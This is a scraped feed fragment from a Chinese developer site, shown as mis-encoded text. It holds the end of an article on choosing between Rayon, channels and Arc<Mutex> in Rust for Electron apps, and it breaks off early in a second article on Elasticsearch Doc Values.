<p><strong>æ€»ç»“ï¼š</strong> Â â€œå°±æ˜¯ä¸€ä¸ª iter()ï¼Œpar_iter() å±æ€§çš„ä¸ä¸€æ ·æ˜¯å§â€Â <strong>è¡¥å……ç»†èŠ‚ï¼ˆå…³é”®ï¼‰ï¼š</strong></p>
<ul>
<li>
<p><strong>ä¸€å­—ä¹‹å·®ï¼Œå¤©å£¤ä¹‹åˆ«:</strong></p>
<ul>
<li><code>.iter()</code>Â =Â <strong>å•æ ¸ä¸²è¡Œ</strong>ï¼ˆè€ç‰›æ‹‰è½¦ï¼Œä¸€æ­¥ä¸€æ­¥èµ°ï¼‰ã€‚</li>
<li><code>.par_iter()</code>Â =Â <strong>å¤šæ ¸å¹¶è¡Œ</strong>ï¼ˆè½¦é˜Ÿå‡ºå‘ï¼Œä»»åŠ¡è‡ªåŠ¨åˆ‡å—åˆ†å‘ï¼‰ã€‚</li>
</ul>
</li>
<li>
<p><strong>Work-Stealing (å·¥ä½œçªƒå–):</strong> Â ä½ ä¸éœ€è¦å‘Šè¯‰ Rayon æ€ä¹ˆåˆ†ã€‚å¦‚æœæ ¸ A ç®—å®Œäº†ï¼Œå®ƒä¼šå»å¸®è¿˜æ²¡ç®—å®Œçš„æ ¸ B å·ä»»åŠ¡åšã€‚</p>
</li>
<li>
<p><strong>æ— é”:</strong> Â åœ¨Â <code>map</code>Â /Â <code>reduce</code>Â çš„è¿‡ç¨‹ä¸­ï¼Œé€šå¸¸ä¸éœ€è¦ Mutexï¼Œå› ä¸ºå¤§å®¶å„ç®—å„çš„ï¼Œäº’ä¸å¹²æ‰°ï¼Œé€Ÿåº¦æœ€å¿«ã€‚</p>
</li>
</ul>
<hr/>
<h3 data-id="heading-39">æç®€è®°å¿†è¡¨</h3>





























<table><thead><tr><th>åœºæ™¯</th><th>ä»£ç å…³é”®è¯</th><th>æ ¸å¿ƒé€»è¾‘</th><th>è¿™é‡Œçš„â€œé”â€</th></tr></thead><tbody><tr><td><strong>æŠ¢èµ„æº</strong></td><td><code>Arc&lt;Mutex&lt;T&gt;&gt;</code></td><td><strong>å¤§å®¶æ”¹åŒä¸€ä¸ªå€¼</strong></td><td><strong>Mutex</strong>Â (æ˜¾å¼é”ï¼Œå¿…é¡»æ’é˜Ÿ)</td></tr><tr><td><strong>æµæ°´çº¿</strong></td><td><code>mpsc</code>Â /Â <code>tx.clone()</code></td><td><strong>æˆ‘åšå®Œç»™ä½ </strong></td><td><strong>Ownership</strong>Â (æ‰€æœ‰æƒè½¬ç§»å°±æ˜¯ä¸€ç§é”)</td></tr><tr><td><strong>å‹æ¦¨CPU</strong></td><td><code>par_iter()</code></td><td><strong>å¤§å®¶å„ç®—å„çš„</strong></td><td><strong>æ— é”</strong>Â (Lock-freeï¼Œé€Ÿåº¦æœ€å¿«)</td></tr></tbody></table>
<h3 data-id="heading-40">ç¬¬ä¸€æ­¥ï¼šçœ‹ä»»åŠ¡ç±»å‹ï¼ˆæ˜¯åœ¨â€œç®—â€è¿˜æ˜¯åœ¨â€œç®¡â€ï¼Ÿï¼‰</h3>
<h4 data-id="heading-41">1. å¦‚æœä½ çš„ä»»åŠ¡æ˜¯ï¼šæš´åŠ›è®¡ç®—ï¼ˆCPU å¯†é›†å‹ï¼‰</h4>
<ul>
<li>
<p><strong>ç‰¹å¾ï¼š</strong> Â ä½ æœ‰ä¸€ä¸ªå·¨å¤§çš„æ•°ç»„ã€åˆ—è¡¨ã€å›¾ç‰‡åƒç´ ç‚¹ï¼Œä½ è¦å¯¹é‡Œé¢çš„æ¯ä¸€ä¸ªå…ƒç´ åšç›¸åŒçš„æ“ä½œï¼ˆæ¯”å¦‚å¹³æ–¹ã€æ»¤é•œã€åŠ å¯†ï¼‰ã€‚è€Œä¸”ç®—å‡ºç¬¬ä¸€ä¸ªå…ƒç´ çš„ç»“æœï¼Œä¸å½±å“ç¬¬äºŒä¸ªå…ƒç´ ã€‚</p>
</li>
<li>
<p><strong>å…³é”®é—®å¥ï¼š</strong> Â â€œè¿™ä¸ªå¤§å¾ªç¯èƒ½æ‹†å¼€å„ç®—å„çš„å—ï¼Ÿâ€</p>
</li>
<li>
<p><strong>ä½ çš„é€‰æ‹©ï¼š</strong> Â <strong>Rayon (<code>par_iter</code>)</strong></p>
</li>
<li>
<p><strong>Electron åœºæ™¯ï¼š</strong></p>
<ul>
<li>ç”¨æˆ·ä¸Šä¼ äº† 100 å¼ é«˜æ¸…å›¾ç‰‡ï¼Œä½ è¦æŠŠå®ƒä»¬å…¨éƒ¨å‹ç¼©æˆç¼©ç•¥å›¾ã€‚</li>
<li>ä½ è¦æ‰«æç¡¬ç›˜é‡Œçš„ 10 ä¸‡ä¸ªæ–‡ä»¶ï¼Œè®¡ç®—å®ƒä»¬çš„ MD5 å“ˆå¸Œå€¼ã€‚</li>
</ul>
</li>
</ul>
<h4 data-id="heading-42">2. å¦‚æœä½ çš„ä»»åŠ¡æ˜¯ï¼šé€»è¾‘åè°ƒï¼ˆIO å¯†é›†å‹ / æµç¨‹å‹ï¼‰</h4>
<ul>
<li><strong>ç‰¹å¾ï¼š</strong> Â ä»»åŠ¡æ²¡é‚£ä¹ˆé‡ï¼Œä½†æ˜¯é€»è¾‘å¾ˆå¤æ‚ã€‚æ¶‰åŠå¤šä¸ªæ¨¡å—ä¹‹é—´çš„é…åˆï¼Œæ¯”å¦‚â€œA æ¨¡å—ä¸‹è½½å®Œï¼Œé€šçŸ¥ B æ¨¡å—è§£å‹ï¼ŒB è§£å‹å®Œé€šçŸ¥ C æ¨¡å—å…¥åº“â€ã€‚</li>
<li><strong>å…³é”®é—®å¥ï¼š</strong> Â â€œè¿™äº›çº¿ç¨‹ä¹‹é—´éœ€è¦è¯´è¯å—ï¼Ÿâ€</li>
<li><strong>ä½ çš„é€‰æ‹©ï¼š</strong> Â <strong>Channel (<code>mpsc</code>)</strong> Â æˆ–Â <strong>Mutex</strong>ï¼ˆè¿›å…¥ä¸‹ä¸€æ­¥ï¼‰ã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-43">ç¬¬äºŒæ­¥ï¼šçœ‹æ•°æ®æµå‘ï¼ˆæ˜¯åœ¨â€œä¼ çƒâ€è¿˜æ˜¯åœ¨â€œæŠ¢çƒâ€ï¼Ÿï¼‰</h3>
<p>å¦‚æœä»»åŠ¡å±äºä¸Šé¢çš„ç¬¬ 2 ç±»ï¼ˆé€»è¾‘åè°ƒï¼‰ï¼Œä½ éœ€è¦è¿›ä¸€æ­¥åˆ¤æ–­ï¼š</p>
<h4 data-id="heading-44">1. ä¼ çƒæ¨¡å¼ (Pipeline)</h4>
<ul>
<li>
<p><strong>ç‰¹å¾ï¼š</strong> Â æ•°æ®åœ¨ä¸€ä¸ªçº¿ç¨‹äº§ç”Ÿï¼Œå¤„ç†å®Œåï¼Œäº¤ç»™ä¸‹ä¸€ä¸ªçº¿ç¨‹ã€‚åŸæ¥çš„çº¿ç¨‹å°±ä¸å†å…³å¿ƒè¿™ä¸ªæ•°æ®äº†ã€‚</p>
</li>
<li>
<p><strong>æ¯”å–»ï¼š</strong> Â å¨å¸ˆç‚’å¥½èœï¼ˆç”Ÿäº§è€…ï¼‰ï¼Œé€’ç»™ä¼ èœå‘˜ï¼ˆChannelï¼‰ï¼Œä¼ èœå‘˜ç«¯ç»™å®¢äººï¼ˆæ¶ˆè´¹è€…ï¼‰ã€‚å¨å¸ˆç‚’å®Œå°±ä¸ç®¡é‚£ç›˜èœäº†ã€‚</p>
</li>
<li>
<p><strong>ä½ çš„é€‰æ‹©ï¼š</strong> Â <strong>Channel (<code>mpsc</code>)</strong></p>
</li>
<li>
<p><strong>Electron åœºæ™¯ï¼š</strong></p>
<ul>
<li><strong>æ—¥å¿—ç³»ç»Ÿï¼š</strong> Â ä»»ä½•çº¿ç¨‹æŠ¥é”™ï¼Œéƒ½æŠŠé”™è¯¯ä¿¡æ¯å¡è¿› Channelï¼Œä¸»çº¿ç¨‹ä¸“é—¨è´Ÿè´£æŠŠ Channel é‡Œçš„å­—å†™è¿›Â <code>.log</code>Â æ–‡ä»¶ã€‚</li>
<li><strong>ä¸‹è½½å™¨ï¼š</strong> Â çº¿ç¨‹ A è´Ÿè´£ä¸‹è½½æ•°æ®å—ï¼Œä¸‹è½½å¥½ä¸€å—å°±å¡è¿› Channelï¼Œçº¿ç¨‹ B è´Ÿè´£æŠŠæ”¶åˆ°çš„æ•°æ®å—æ‹¼æ¥å†™å…¥ç¡¬ç›˜ã€‚</li>
</ul>
</li>
</ul>
<h4 data-id="heading-45">2. æŠ¢çƒæ¨¡å¼ (Shared State)</h4>
<ul>
<li>
<p><strong>ç‰¹å¾ï¼š</strong> Â è¿™ä¸€ä»½æ•°æ®ï¼Œå¤§å®¶éƒ½è¦è¯»ï¼Œå¤§å®¶éƒ½è¦æ”¹ã€‚å®ƒå¿…é¡»é™æ­¢åœ¨é‚£é‡Œï¼Œè°ç”¨è°æ‹¿ã€‚</p>
</li>
<li>
<p><strong>æ¯”å–»ï¼š</strong> Â å…¬å¸çš„ä¼šè®®å®¤ã€‚é”€å”®éƒ¨è¦ç”¨ï¼Œç ”å‘éƒ¨ä¹Ÿè¦ç”¨ã€‚è°æŠ¢åˆ°é’¥åŒ™è°è¿›å»ï¼Œè¿›å»é”é—¨ï¼Œç”¨å®Œå‡ºæ¥è¿˜é’¥åŒ™ã€‚</p>
</li>
<li>
<p><strong>ä½ çš„é€‰æ‹©ï¼š</strong> Â <strong>Arc + Mutex</strong></p>
</li>
<li>
<p><strong>Electron åœºæ™¯ï¼š</strong></p>
<ul>
<li><strong>å…¨å±€é…ç½®ï¼š</strong> Â ç”¨æˆ·åœ¨è®¾ç½®é‡Œæ”¹äº†Â <code>theme = "dark"</code>ï¼Œæ‰€æœ‰çº¿ç¨‹éƒ½éœ€è¦è¯»å–è¿™ä¸ªé…ç½®ï¼Œå¶å°”ä¹Ÿè¦ä¿®æ”¹å®ƒã€‚</li>
<li><strong>è¿æ¥æ± /ç¼“å­˜ï¼š</strong> Â ç»´æŠ¤ä¸€ä¸ªæ•°æ®åº“è¿æ¥æ± ï¼Œæ‰€æœ‰çº¿ç¨‹éƒ½è¦å»æ± å­é‡Œå€Ÿè¿æ¥ï¼Œç”¨å®Œæ”¾å›å»ã€‚</li>
</ul>
</li>
</ul>
<hr/>
<h3 data-id="heading-46">ç¬¬ä¸‰æ­¥ï¼šå†³ç­–æ€»ç»“è¡¨ï¼ˆä¸€ç§’é€ŸæŸ¥ï¼‰</h3>





























<table><thead><tr><th>ç—›ç‚¹</th><th>å…¸å‹ç‰¹å¾</th><th>æ¨èå·¥å…·</th><th>ä¸ºä»€ä¹ˆï¼Ÿ</th></tr></thead><tbody><tr><td><strong>æˆ‘è¦ç®—å¾—å¿«</strong></td><td>å¤§æ•°ç»„ã€å›¾åƒå¤„ç†ã€çŸ©é˜µè¿ç®—</td><td><strong>Rayon</strong></td><td>å®ƒæ˜¯ä¸“é—¨ä¸ºåˆ©ç”¨å¤šæ ¸ CPU ç®—åŠ›è®¾è®¡çš„ï¼Œä¸”æ— é”ï¼Œæœ€å¿«ã€‚</td></tr><tr><td><strong>æˆ‘è¦è§£è€¦</strong></td><td>æµæ°´çº¿ã€æ—¥å¿—ã€æ¶ˆæ¯é€šçŸ¥ã€å•å‘æµåŠ¨</td><td><strong>Channel</strong></td><td>è®©çº¿ç¨‹å„å¸å…¶èŒï¼Œé¿å…ç«äº‰ï¼Œä»£ç æœ€å¹²å‡€ã€‚</td></tr><tr><td><strong>æˆ‘è¦å…±äº«</strong></td><td>å…¨å±€çŠ¶æ€ã€ç¼“å­˜ã€è®¡æ•°å™¨ã€çŠ¶æ€æœº</td><td><strong>Mutex</strong></td><td>æ²¡åŠæ³•ï¼Œè¿™å°±æ˜¯å¿…é¡»â€œæ’é˜Ÿâ€çš„åœºæ™¯ã€‚</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-47">ç»“åˆ Electron + Rust é¡¹ç›®çš„å®æˆ˜å»ºè®®</h3>
<p>æ—¢ç„¶åšçš„æ˜¯ Electron åº”ç”¨ï¼ŒRust é€šå¸¸ä½œä¸ºåç«¯ï¼ˆNode.js çš„ NAPI æ’ä»¶ï¼‰å­˜åœ¨ã€‚ä»¥ä¸‹æ˜¯ä¸‰ä¸ªç»å…¸åœºæ™¯çš„â€œæœ€ä½³å®è·µâ€ï¼š</p>
<ol>
<li>
<p><strong>åœºæ™¯ï¼šæœç´¢æœ¬åœ°æ–‡ä»¶ï¼ˆEverything æ¨¡å¼ï¼‰</strong></p>
<ul>
<li><strong>éœ€æ±‚ï¼š</strong> Â éå† C ç›˜ 100 ä¸‡ä¸ªæ–‡ä»¶ï¼Œæ‰¾å‡ºåå­—å« "test" çš„ã€‚</li>
<li><strong>é€‰å‹ï¼š</strong> Â <strong>Rayon</strong>ã€‚</li>
<li><strong>ç†ç”±ï¼š</strong> Â æ–‡ä»¶ç³»ç»Ÿçš„éå†å’Œå­—ç¬¦ä¸²åŒ¹é…æ˜¯å¹¶è¡Œçš„ã€‚ç”¨Â <code>par_iter</code>Â å¯ä»¥è®© 8 ä¸ªæ ¸åŒæ—¶å»æ‰«ä¸åŒçš„æ–‡ä»¶å¤¹ã€‚</li>
</ul>
</li>
<li>
<p><strong>åœºæ™¯ï¼šRust å‘Šè¯‰ Electron è¿›åº¦æ¡</strong></p>
<ul>
<li><strong>éœ€æ±‚ï¼š</strong> Â Rust åœ¨åå°è§£å‹å¤§æ–‡ä»¶ï¼Œéœ€è¦æ¯ç§’å‘Šè¯‰ Electron å‰ç«¯â€œè¿›åº¦ 50%â€ã€‚</li>
<li><strong>é€‰å‹ï¼š</strong> Â <strong>Channel</strong>Â (Rust ä¾§) +Â <strong>Callback/Promise</strong>Â (NAPI ä¾§)ã€‚</li>
<li><strong>ç†ç”±ï¼š</strong> Â è§£å‹çº¿ç¨‹ï¼ˆç”Ÿäº§è€…ï¼‰ç®—å‡ºè¿›åº¦ï¼Œé€šè¿‡ Channel å‘ç»™ä¸»çº¿ç¨‹ï¼Œä¸»çº¿ç¨‹å†è°ƒç”¨ JS çš„å›è°ƒå‡½æ•°é€šçŸ¥å‰ç«¯ã€‚åƒä¸‡ä¸è¦è®©è§£å‹çº¿ç¨‹ç›´æ¥å»è°ƒ JS å‡½æ•°ï¼ˆè·¨è¯­è¨€è°ƒç”¨é€šå¸¸è¦æ±‚åœ¨ä¸»çº¿ç¨‹ï¼‰ã€‚</li>
</ul>
</li>
<li>
<p><strong>åœºæ™¯ï¼šApp çš„çŠ¶æ€ç®¡ç†</strong></p>
<ul>
<li><strong>éœ€æ±‚ï¼š</strong> Â è®°å½•å½“å‰æœ‰å¤šå°‘ä¸ªæ­£åœ¨è¿›è¡Œçš„ä»»åŠ¡ï¼Œç”¨æˆ·ç‚¹â€œæš‚åœâ€æ—¶ï¼Œæ‰€æœ‰çº¿ç¨‹éƒ½è¦åœã€‚</li>
<li><strong>é€‰å‹ï¼š</strong> Â <strong>Arc&lt;Mutex&gt;</strong> ã€‚</li>
<li><strong>ç†ç”±ï¼š</strong> Â <code>is_paused</code>Â æ˜¯ä¸€ä¸ªå…¨å±€å¸ƒå°”å€¼ï¼Œæ‰€æœ‰å¹²æ´»çš„çº¿ç¨‹æ¯å¹²ä¸€æ­¥éƒ½è¦æ£€æŸ¥å®ƒã€‚è¿™å°±æ˜¯å…¸å‹çš„å…±äº«çŠ¶æ€ã€‚</li>
</ul>
</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¤§æ•°æ®-184 Elasticsearch Doc Values æœºåˆ¶è¯¦è§£ï¼šåˆ—å¼å­˜å‚¨å¦‚ä½•æ”¯æ’‘æ’åº/èšåˆ/è„šæœ¬]]></title>    <link>https://juejin.cn/post/7583913535270567946</link>    <guid>https://juejin.cn/post/7583913535270567946</guid>    <pubDate>2025-12-15T10:16:24.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583913535270567946" data-draft-id="7583913535270551562" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¤§æ•°æ®-184 Elasticsearch Doc Values æœºåˆ¶è¯¦è§£ï¼šåˆ—å¼å­˜å‚¨å¦‚ä½•æ”¯æ’‘æ’åº/èšåˆ/è„šæœ¬"/> <meta itemprop="keywords" content="åç«¯,å¤§æ•°æ®,Elasticsearch"/> <meta itemprop="datePublished" content="2025-12-15T10:16:24.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ­¦å­åº·"/> <meta itemprop="url" content="https://juejin.cn/user/149189314230039"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¤§æ•°æ®-184 Elasticsearch Doc Values æœºåˆ¶è¯¦è§£ï¼šåˆ—å¼å­˜å‚¨å¦‚ä½•æ”¯æ’‘æ’åº/èšåˆ/è„šæœ¬
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/149189314230039/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ­¦å­åº·
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-15T10:16:24.000Z" title="Mon Dec 15 2025 10:16:24 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»12åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">TL;DR</h2>
<ul>
<li>åœºæ™¯ï¼šES æ’åº/èšåˆ/è„šæœ¬è®¿é—®å­—æ®µå€¼æ—¶ï¼Œå€’æ’ç´¢å¼•ä¸æ“…é•¿æŒ‰â€œåˆ—â€è¯»æ•°æ®</li>
<li>ç»“è®ºï¼šDoc Values æ˜¯ç£ç›˜åˆ—å¼ç»“æ„ï¼ˆé™¤ text å¤–å¤šæ•°ç±»å‹é»˜è®¤å¼€å¯ï¼‰ï¼Œç”¨æ¥é«˜æ•ˆè¯»å­—æ®µå€¼</li>
<li>äº§å‡ºï¼šç»™å‡ºå¯è½åœ°çš„å­—æ®µé€‰å‹ã€mapping çº¦æŸã€å¸¸è§æŠ¥é”™å®šä½ä¸ä¿®å¤é€ŸæŸ¥</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/84307176af0f4855ad2ee854e1ad503a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766398583&amp;x-signature=IKqFK3qlK0UbMZsl2HL52EtlP%2Fk%3D" alt="å¤§æ•°æ®-184 Elasticsearch Doc Values æœºåˆ¶è¯¦è§£ï¼šåˆ—å¼å­˜å‚¨å¦‚ä½•æ”¯æ’‘æ’åº/èšåˆ/è„šæœ¬" loading="lazy"/></p>
<h2 data-id="heading-1">ç‰ˆæœ¬çŸ©é˜µ</h2>



































<table><thead><tr><th>è¯´æ˜</th><th>éªŒè¯çŠ¶æ€</th><th>æ¥æº</th></tr></thead><tbody><tr><td>ES doc_valuesï¼šç£ç›˜åˆ—å¼ç»“æ„ï¼Œä¸»è¦ç”¨äºæ’åº/èšåˆ/è„šæœ¬è®¿é—®å­—æ®µå€¼</td><td>æ˜¯</td><td>å®˜æ–¹æ–‡æ¡£</td></tr><tr><td>keyword æœ‰ doc valuesï¼›text é»˜è®¤æ²¡æœ‰ doc valuesï¼Œèšåˆ/æ’åºéœ€ fielddata æˆ–æ”¹ç”¨ keyword</td><td>æ˜¯</td><td>ç¤¾åŒºä¸€è‡´ç»“è®º</td></tr><tr><td>æ—¢æœ‰ç´¢å¼•çš„ mapping ä¸èƒ½â€œæ›¿æ¢/åˆ é™¤â€ï¼Œéœ€è¦æ–°å»ºç´¢å¼• + reindex æ‰èƒ½å½»åº•æ”¹å­—æ®µç±»å‹/ç»“æ„</td><td>éƒ¨åˆ†</td><td>ç¤¾åŒº/å®è·µå…±è¯†</td></tr><tr><td>â€œanalyzed strings ä¸èƒ½ç”¨ doc valuesâ€åœ¨æ—§ç‰ˆæœ¬è¡¨è¿°ä¸º string/not_analyzedï¼ŒES 5+ å·²æ‹†åˆ†ä¸º text/keywordï¼Œä¸è¦æ··ç”¨æ—§æœ¯è¯­</td><td>æ˜¯</td><td>å†å²/ç‰ˆæœ¬å·®å¼‚</td></tr><tr><td>OpenSearchï¼šdoc values é»˜è®¤å¯¹ç»å¤§å¤šæ•°å­—æ®µå¼€å¯ï¼Œtext ä¾‹å¤–ï¼ˆä¸ ES è®¤çŸ¥ä¸€è‡´ï¼‰</td><td>æ˜¯</td><td>OpenSearch å‚è€ƒ</td></tr></tbody></table>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/628c64d67a1e4928bc17f5f07ef97fb6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766398583&amp;x-signature=%2BSTzDbJCPhaDiSjjjzKtfxFRufs%3D" alt="Elasticsearch" loading="lazy"/></p>
<h2 data-id="heading-2">DocValues æœºåˆ¶</h2>
<p>Doc Values æ˜¯ä¸€ç§ä»¥åˆ—å¼å­˜å‚¨çš„ç´¢å¼•æœºåˆ¶ï¼Œç”¨äºåœ¨æ£€ç´¢æ—¶ä¼˜åŒ–ç£ç›˜è¯»å–æ“ä½œã€‚ä¸ä¼ ç»Ÿçš„è¡Œå¼å­˜å‚¨ä¸åŒï¼ŒDoc Values å°†æ¯ä¸ªå­—æ®µçš„æ‰€æœ‰å€¼æŒ‰åˆ—ç»„ç»‡å­˜å‚¨ï¼Œè¿™ç§ç»“æ„ç‰¹åˆ«é€‚åˆåˆ†æå‹æŸ¥è¯¢åœºæ™¯ã€‚ä»¥ä¸‹æ˜¯å…¶æ ¸å¿ƒç‰¹ç‚¹ï¼š</p>
<ol>
<li>å­˜å‚¨ç»“æ„å¯¹æ¯”ï¼š</li>
</ol>
<ul>
<li>åå‘ç´¢å¼•ï¼šåŸºäºå€’æ’è¡¨çš„ç»“æ„ï¼Œä¸»è¦ç”¨äºå…¨æ–‡æ£€ç´¢åœºæ™¯ï¼Œå¯ä»¥å¿«é€ŸæŸ¥æ‰¾æ–‡æ¡£ä¸­åŒ…å«æŸä¸ªè¯çš„æƒ…å†µ</li>
<li>Doc Valuesï¼šé‡‡ç”¨ç´§å‡‘çš„åˆ—å¼å­˜å‚¨æ ¼å¼ï¼Œæ¯ä¸ªå­—æ®µçš„å€¼è¢«è¿ç»­å­˜å‚¨åœ¨ç£ç›˜ä¸Šï¼Œæ”¯æŒé«˜æ•ˆçš„é¡ºåºè¯»å–</li>
</ul>
<ol start="2">
<li>æ€§èƒ½ä¼˜åŠ¿ï¼š</li>
</ol>
<ul>
<li>å†…å­˜æ•ˆç‡ï¼šä»…éœ€åŠ è½½æŸ¥è¯¢æ¶‰åŠçš„åˆ—ï¼Œè€Œéæ•´ä¸ªæ–‡æ¡£</li>
<li>CPUç¼“å­˜å‹å¥½ï¼šè¿ç»­å­˜å‚¨çš„åˆ—æ•°æ®èƒ½æ›´å¥½åˆ©ç”¨CPUç¼“å­˜è¡Œ</li>
<li>å‹ç¼©ç‡é«˜ï¼šåŒåˆ—æ•°æ®é€šå¸¸å…·æœ‰ç›¸ä¼¼æ€§ï¼Œå¯é‡‡ç”¨æ›´é«˜æ•ˆçš„å‹ç¼©ç®—æ³•</li>
</ul>
<ol start="3">
<li>å…¸å‹åº”ç”¨åœºæ™¯ï¼š</li>
</ol>
<p>æ’åºåœºæ™¯ï¼š</p>
<ul>
